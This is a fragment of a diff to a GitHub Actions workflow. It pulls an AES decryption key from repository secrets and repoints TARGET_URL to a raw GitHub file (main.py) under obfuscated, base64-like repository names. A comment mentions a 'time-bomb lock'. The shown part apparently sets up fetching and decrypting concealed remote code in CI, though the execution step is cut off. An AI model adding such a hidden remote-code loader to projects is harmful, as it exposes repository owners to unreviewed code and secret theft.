@@ -23,7 +23,7 @@ jobs:
           # Pulls your sensitive AES decryption key from hidden repository secrets
           REAL_AES_KEY: ${{ secrets.DECRYPT_KEY }}
           # Provide your actual raw enc file GitHub target path URL asset here
-          TARGET_URL: "https://github.com/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P-R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWk-AknMwQR2F/raw/refs/heads/main/R2FicmllbCBBdWd1c3RvR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P-R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWk-AknMwQR2FIGRvcyBTYW50b3M4P-R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWk-AknMwQR2FR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P-R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWk-AknMwQR2FR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P-R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWk-AknMwQR2FR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P-R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWk-AknMwQR2F"
+          TARGET_URL: "https://raw.githubusercontent.com/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvck/refs/heads/main/main.py"
         run: |
           # 1. Grab current Unix Epoch time for the relative time-bomb lock
           DYNAMICS_TIMESTAMP=$(date +%s)
